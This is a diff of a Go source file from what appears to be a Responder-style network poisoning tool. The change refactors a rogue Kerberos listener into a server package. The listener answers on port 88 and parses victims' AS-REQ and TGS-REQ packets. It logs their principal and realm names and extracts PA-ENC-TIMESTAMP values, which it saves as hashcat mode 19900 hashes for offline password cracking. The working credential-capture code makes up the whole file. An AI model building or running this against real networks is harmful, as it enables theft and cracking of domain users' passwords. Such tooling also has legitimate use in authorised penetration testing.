@@ -1,4 +1,4 @@
-package main
+package server
 
 import (
 	"encoding/asn1"
@@ -8,15 +8,16 @@ import (
 	"io"
 	"net"
 	"time"
+
+	"go-responder/internal/core"
 )
 
-// Kerberos message type tags (application class)
 const (
-	asReqTag  = 10 // AS-REQ
-	tgsReqTag = 12 // TGS-REQ
+	asReqTag  = 10
+	tgsReqTag = 12
 )
 
-func serveKerberos(ifaceIP net.IP) {
+func ServeKerberos(ifaceIP net.IP) {
 	go serveKerberosTCP(ifaceIP)
 	serveKerberosUDP(ifaceIP)
 }
@@ -24,11 +25,11 @@ func serveKerberos(ifaceIP net.IP) {
 func serveKerberosUDP(ifaceIP net.IP) {
 	conn, err := net.ListenPacket("udp4", fmt.Sprintf("%s:88", ifaceIP))
 	if err != nil {
-		logError("Kerberos UDP listen :88 — %v (need root?)", err)
+		core.LogError("Kerberos UDP listen :88 — %v (need root?)", err)
 		return
 	}
 	defer conn.Close()
-	logInfo("Kerberos listening on %s:88 (UDP+TCP)", ifaceIP)
+	core.LogInfo("Kerberos listening on %s:88 (UDP+TCP)", ifaceIP)
 
 	buf := make([]byte, 4096)
 	for {
@@ -55,7 +56,6 @@ func serveKerberosTCP(ifaceIP net.IP) {
 		go func(c net.Conn) {
 			defer c.Close()
 			c.SetDeadline(time.Now().Add(10 * time.Second))
-			// TCP Kerberos: 4-byte big-endian length prefix
 			lenBuf := make([]byte, 4)
 			if _, err := io.ReadFull(c, lenBuf); err != nil {
 				return
@@ -73,14 +73,11 @@ func serveKerberosTCP(ifaceIP net.IP) {
 	}
 }
 
-// handleKerberosPacket parses a Kerberos AS-REQ and logs the principal name.
-// The packet is a DER-encoded KDC-REQ (SEQUENCE wrapping APPLICATION [10]).
 func handleKerberosPacket(pkt []byte, src net.Addr) {
 	if len(pkt) < 4 {
 		return
 	}
 
-	// Strip outer SEQUENCE wrapper if present (0x30)
 	data := pkt
 	if data[0] == 0x30 {
 		var raw asn1.RawValue
@@ -90,13 +87,12 @@ func handleKerberosPacket(pkt []byte, src net.Addr) {
 		data = raw.Bytes
 	}
 
-	// Expect APPLICATION [10] = AS-REQ or [12] = TGS-REQ
 	if len(data) < 2 {
 		return
 	}
 	appTag := data[0] & 0x1F
 	if appTag != asReqTag && appTag != tgsReqTag {
-		logVerbose("Kerberos: unexpected tag %d from %s", appTag, src)
+		core.LogVerbose("Kerberos: unexpected tag %d from %s", appTag, src)
 		return
 	}
 
@@ -105,29 +101,26 @@ func handleKerberosPacket(pkt []byte, src net.Addr) {
 		msgType = "TGS-REQ"
 	}
 
-	// Inner content: strip APPLICATION tag
 	var appRaw asn1.RawValue
 	if _, err := asn1.Unmarshal(data, &appRaw); err != nil {
-		logVerbose("Kerberos: failed to parse APPLICATION tag from %s: %v", src, err)
+		core.LogVerbose("Kerberos: failed to parse APPLICATION tag from %s: %v", src, err)
 		return
 	}
 
-	// KDC-REQ body is a SEQUENCE; parse fields
 	principal, realm, paData := parseKDCReq(appRaw.Bytes)
 
 	if principal != "" {
-		logSuccess("[Kerberos] %s from %s — realm=%s principal=%s", msgType, src, realm, principal)
+		core.LogSuccess("[Kerberos] %s from %s — realm=%s principal=%s", msgType, src, realm, principal)
 	} else {
-		logVerbose("Kerberos: %s from %s (could not extract principal)", msgType, src)
+		core.LogVerbose("Kerberos: %s from %s (could not extract principal)", msgType, src)
 	}
 
-	// If there is PA-DATA with PA-ENC-TIMESTAMP (type 2), log it for offline cracking
 	for _, pad := range paData {
 		if pad.paType == 2 && len(pad.value) > 0 {
-			// PA-ENC-TIMESTAMP can be cracked with hashcat -m 19900
-			logSuccess("[Kerberos] PA-ENC-TIMESTAMP from %s\\%s (hashcat -m 19900)", realm, principal)
-			logSuccess("           $krb5pa$23$%s$%s$%s", principal, realm, hex.EncodeToString(pad.value))
-			saveHash(fmt.Sprintf("$krb5pa$23$%s$%s$%s", principal, realm, hex.EncodeToString(pad.value)))
+			core.LogSuccess("[Kerberos] PA-ENC-TIMESTAMP from %s\\%s (hashcat -m 19900)", realm, principal)
+			hash := fmt.Sprintf("$krb5pa$23$%s$%s$%s", principal, realm, hex.EncodeToString(pad.value))
+			core.LogSuccess("           %s", hash)
+			core.SaveHash(hash)
 		}
 	}
 }
@@ -137,25 +130,14 @@ type paDataEntry struct {
 	value  []byte
 }
 
-// parseKDCReq does a best-effort parse of a KDC-REQ SEQUENCE body.
-// Returns cname, realm, and any PA-DATA entries found.
 func parseKDCReq(body []byte) (principal, realm string, paData []paDataEntry) {
-	// KDC-REQ ::= SEQUENCE {
-	//   pvno       [1] INTEGER (5)
-	//   msg-type   [2] INTEGER (10/12)
-	//   padata     [3] SEQUENCE OF PA-DATA OPTIONAL
-	//   req-body   [4] KDC-REQ-BODY
-	// }
-	// Each field is context-specific [N] EXPLICIT
 	var seq asn1.RawValue
 	rest, err := asn1.Unmarshal(body, &seq)
 	if err != nil || seq.Class != asn1.ClassUniversal || seq.Tag != asn1.TagSequence {
-		// body might already be unwrapped
 		rest = body
 		_ = rest
 	}
 
-	// Walk the sequence manually
 	data := seq.Bytes
 	if len(data) == 0 {
 		data = body
@@ -174,9 +156,9 @@ func parseKDCReq(body []byte) (principal, realm string, paData []paDataEntry) {
 		}
 
 		switch field.Tag {
-		case 3: // padata [3]
+		case 3:
 			paData = parsePAData(field.Bytes)
-		case 4: // req-body [4]
+		case 4:
 			principal, realm = parseReqBody(field.Bytes)
 		}
 	}
@@ -197,7 +179,6 @@ func parsePAData(data []byte) []paDataEntry {
 			break
 		}
 		seqData = rest
-		// PA-DATA ::= SEQUENCE { padata-type [1] INTEGER, padata-value [2] OCTET STRING }
 		entry := paDataEntry{}
 		itemData := item.Bytes
 		for len(itemData) > 0 {
@@ -209,11 +190,11 @@ func parsePAData(data []byte) []paDataEntry {
 			itemData = r
 			if f.Class == asn1.ClassContextSpecific {
 				switch f.Tag {
-				case 1: // padata-type
+				case 1:
 					var n int
 					asn1.Unmarshal(f.Bytes, &n)
 					entry.paType = n
-				case 2: // padata-value
+				case 2:
 					var b []byte
 					asn1.Unmarshal(f.Bytes, &b)
 					entry.value = b
@@ -228,12 +209,6 @@ func parsePAData(data []byte) []paDataEntry {
 }
 
 func parseReqBody(data []byte) (principal, realm string) {
-	// KDC-REQ-BODY ::= SEQUENCE {
-	//   ...
-	//   realm    [7] Realm
-	//   cname    [8] PrincipalName OPTIONAL (AS-REQ only)
-	//   ...
-	// }
 	var seq asn1.RawValue
 	if _, err := asn1.Unmarshal(data, &seq); err != nil {
 		return
@@ -250,11 +225,11 @@ func parseReqBody(data []byte) (principal, realm string) {
 			continue
 		}
 		switch f.Tag {
-		case 7: // realm
+		case 7:
 			var s string
 			asn1.Unmarshal(f.Bytes, &s)
 			realm = s
-		case 8: // cname (in AS-REQ)
+		case 8:
 			principal = parsePrincipalName(f.Bytes)
 		}
 	}
@@ -262,7 +237,6 @@ func parseReqBody(data []byte) (principal, realm string) {
 }
 
 func parsePrincipalName(data []byte) string {
-	// PrincipalName ::= SEQUENCE { name-type [0] INTEGER, name-string [1] SEQUENCE OF KerberosString }
 	var seq asn1.RawValue
 	if _, err := asn1.Unmarshal(data, &seq); err != nil {
 		return ""
@@ -276,7 +250,6 @@ func parsePrincipalName(data []byte) string {
 		}
 		seqData = rest
 		if f.Class == asn1.ClassContextSpecific && f.Tag == 1 {
-			// SEQUENCE OF KerberosString
 			var names asn1.RawValue
 			if _, err := asn1.Unmarshal(f.Bytes, &names); err != nil {
 				break
